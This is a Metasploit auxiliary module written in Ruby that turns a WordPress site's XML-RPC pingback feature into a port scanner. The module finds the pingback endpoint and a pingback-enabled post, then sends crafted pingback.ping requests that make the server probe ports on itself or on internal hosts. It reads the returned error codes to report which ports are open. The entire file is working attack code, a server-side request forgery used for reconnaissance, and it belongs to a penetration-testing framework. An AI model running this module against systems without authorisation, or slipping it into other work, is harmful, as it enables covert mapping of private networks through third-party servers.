##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name' => 'Wordpress Pingback Port Scanner',
			'Description' => %q{
					This module will perform a port scan using the Pingback API.
					You can even scan the server itself or discover some hosts on
					the internal network this server is part of.
				},
			'Author' =>
				[
					'Brandon McCann "zeknox" <bmccann[at]accuvant.com>' ,
					'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>',
					'FireFart', # Original PoC
				],
			'License' => MSF_LICENSE,
			'References'  =>
				[
					[ 'URL', 'http://www.securityfocus.com/archive/1/525045/30/30/threaded'],
					[ 'URL', 'http://www.ethicalhack3r.co.uk/security/introduction-to-the-wordpress-xml-rpc-api/'],
					[ 'URL', 'https://github.com/FireFart/WordpressPingbackPortScanner'],
				],
			))

			register_options(
				[
					OptAddressRange.new('SCAN_TARGET', [ true, "Target host you would like to port scan", "127.0.0.1"]),
					OptString.new('PORTS', [ true, "List of ports to scan (e.g. 22,80,137-139)","21-23,80,443"]),
					OptString.new('TARGETURI', [ true, 'The path to wordpress installation (e.g. /wordpress/)', '/'])
				], self.class)

			register_advanced_options(
				[
					OptInt.new('NUM_REDIRECTS', [ true, "Number of HTTP redirects to follow", 3]),
					OptInt.new('MAX_RETRIES', [ true, "Number of retries if cannot determine port status", 3])

				], self.class)

	end

	def setup()
		# If DNS name set variables
		unless datastore['SCAN_TARGET'] =~ /[a-zA-Z]+/
			@is_dns = false
		else
			@is_dns = true
			unless datastore['SCAN_TARGET'] =~ /^http:\/\/.*/
				@target_ip = Rex::Socket.getaddress(datastore['SCAN_TARGET'])
				@target = "http://#{datastore['SCAN_TARGET']}"
			else
				@target_ip = Rex::Socket.getaddress(datastore['SCAN_TARGET'].sub(/^http:\/\//,""))
			end
		end

		# Check if database is active
		if db()
			@db_active = true
		else
			@db_active = false
		end
	end

	def get_xml_rpc_url()
		# code to find the xmlrpc url when passed in RHOST
		print_status("Enumerating XML-RPC URI...")

		begin
			uri = target_uri.path
			uri << '/' if uri[-1,1] != '/'

			res = send_request_cgi(
			{
					'method'	=> 'HEAD',
					'uri'		=> "#{uri}"
			})
			# Check if X-Pingback exists and return value
			if res
				if res['X-Pingback']
					return res['X-Pingback']
				else
					print_error("X-Pingback header not found, quiting")
					return nil
				end
			else
				return nil
			end
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			return nil
		rescue ::Timeout::Error, ::Errno::EPIPE
			return nil
		end
	end

	def get_blog_posts(xml_rpc)
		# find all blog posts within RHOST and determine if pingback is enabled
		print_status("Enumerating Blog posts...")
		blog_posts = {}

		uri = target_uri.path
		uri << '/' if uri[-1,1] != '/'

		# make http request to feed url
		begin
			print_status("Resolving #{datastore['rhost']}#{uri}?feed=rss2 to locate wordpress feed...")

			res = send_request_cgi({
				'uri'    => "#{uri}?feed=rss2",
				'method' => 'GET',
				})

			count = datastore['NUM_REDIRECTS']

			if res
				while (res.code == 301 || res.code == 302) and res.headers['Location'] and count != 0

					print_status("Web server returned a #{res.code}...following to #{res.headers['Location']}")

					uri = res.headers['Location'].sub(/.*?#{datastore['RHOST']}/, "")
					res = send_request_cgi({
						'uri'    => "#{uri}",
						'method' => 'GET',
						})

					if res.code == 200
						print_status("Feed located at http://#{datastore['RHOST']}#{uri}")
					end
					count = count - 1
				end
			else
				return nil
			end
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			print_error("Unable to connect to #{uri}")
			return nil
		rescue ::Timeout::Error, ::Errno::EPIPE
			print_error("Unable to connect to #{uri}")
			return nil
		end

		# parse out links and place in array
		if res.nil? or res.code != 200
			return blog_posts
		end

		links = res.to_s.scan(/<link>([^<]+)<\/link>/i)

		# handle emtpy feeds
		if links.nil? or links.empty?
			return blog_posts
		end

		links.each do |link|
			blog_post = link[0]
			pingback_response = get_pingback_request(xml_rpc, 'http://127.0.0.1', blog_post)

			pingback_disabled_match = pingback_response.body.match(/<value><int>33<\/int><\/value>/i)
			if pingback_response.code == 200 and pingback_disabled_match.nil?
				print_good("Pingback enabled: #{link.join}\n")
				blog_posts = {:xml_rpc => xml_rpc, :blog_post => blog_post}
				return blog_posts
			else
				print_status("Pingback disabled: #{link.join}")
			end
		end
		return blog_posts
	end

	# Creates the XML data to be sent
	def generate_pingback_xml (target, valid_blog_post)
		xml = "<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>"
		xml << "<methodCall>"
		xml << "<methodName>pingback.ping</methodName>"
		xml << "<params>"
		xml << "<param><value><string>#{target}</string></value></param>"
		xml << "<param><value><string>#{valid_blog_post}</string></value></param>"
		xml << "</params>"
		xml << "</methodCall>"
		return xml
	end

	# method to send xml-rpc requests
	def get_pingback_request(xml_rpc, target, blog_post)
		uri = xml_rpc.sub(/.*?#{datastore['RHOST']}/,"")
		# create xml pingback request
		pingback_xml = generate_pingback_xml(target, blog_post)

		# Send post request with crafted XML as data
		begin
			res = send_request_cgi({
				'uri'    => "#{uri}",
				'method' => 'POST',
				'data'	 => "#{pingback_xml}",
				})
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			print_error("Unable to connect to #{uri}")
			return nil
		rescue ::Timeout::Error, ::Errno::EPIPE
			print_error("Unable to connect to #{uri}")
			return nil
		end
		return res
	end

	# method to generate pingback xml-rpc requests
	def generate_requests(xml_rpc_hash, target)
		port_range = Rex::Socket.portspec_to_portlist(datastore['PORTS'])

		# If target is a DNS name, include IP address in print
		if @is_dns
			the_ip = " (#{@target_ip})"
		else
			the_ip = ""
		end

		print_status("Scanning: #{target}#{the_ip}")

		# Port scanner
		max_retry = datastore['MAX_RETRIES']
		current_retry = max_retry
		port_range.each do |i|
			random = (0...8).map { 65.+(rand(26)).chr }.join
			uri = URI(target)
			uri.port = i
			uri.scheme = i == 443 ? "https" : "http"
			uri.path = "/#{random}/"
			pingback_request = get_pingback_request(xml_rpc_hash[:xml_rpc], uri.to_s, xml_rpc_hash[:blog_post])

			# Check returns, determine port status
			if pingback_request.nil?
				if current_retry > 0
					vprint_status("\tIssues with port #{i}, retrying")
					current_retry -= 1
					redo
				else
					print_status("\tCould not identify port #{i}")
					current_retry = max_retry
					next
				end
			else
				closed_match = pingback_request.body.match(/<value><int>16<\/int><\/value>/i)
				if pingback_request.code == 200 and closed_match.nil?
					print_good("\tPort #{i} is open")
					store_service(@target_ip, i, "open") if @db_active
					current_retry = max_retry
				else
					print_status("\tPort #{i} is closed")
					store_service(@target_ip, i, "closed") if @db_active
					current_retry = max_retry
				end
			end
		end
	end

	# Save data to services table
	def store_service(ip, port, state)
		report_service(:host => ip, :port => port, :state => state)
	end

	# main control method
	def run
		begin
			# handle redirect
			res = send_request_cgi({
				'uri'    => '/',
				'method' => 'GET',
			})
			count = datastore['NUM_REDIRECTS']
			while (res.code == 301 || res.code == 302) && count != 0
				uri = res.headers['Location'].sub(/^http:\/\/.*?#{datastore['RHOST']}/, "")
				@target = res.headers['Location'].chomp("/").sub(/^http:\/\//, "")
				res = send_request_cgi({
					'uri'    => "#{uri}",
					'method' => 'GET',
				})
				count = count - 1
			end
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			print_error("Unable to connect to #{datastore['RHOST']}")
			return nil
		rescue ::Timeout::Error, ::Errno::EPIPE
			print_error("Unable to connect to #{datastore['RHOST']}")
			return nil
		end

		# call method to get xmlrpc url
		xmlrpc = get_xml_rpc_url()

		# once xmlrpc url is found, get_blog_posts
		if xmlrpc.nil?
			print_error("#{datastore['RHOST']} does not appear to be vulnerable")
		else
			hash = get_blog_posts(xmlrpc)
			# If not DNS, expand list of IPs and scan each
			if not @is_dns and hash and not hash.empty?
				ip_list = Rex::Socket::RangeWalker.new(datastore['SCAN_TARGET'])
				ip_list.each { |ip|
					generate_requests(hash, "http://#{ip}")
				}
			elsif hash and not hash.empty?
				generate_requests(hash, @target)
			else
				print_error("No vulnerable blogs found...")
			end
		end
	end
end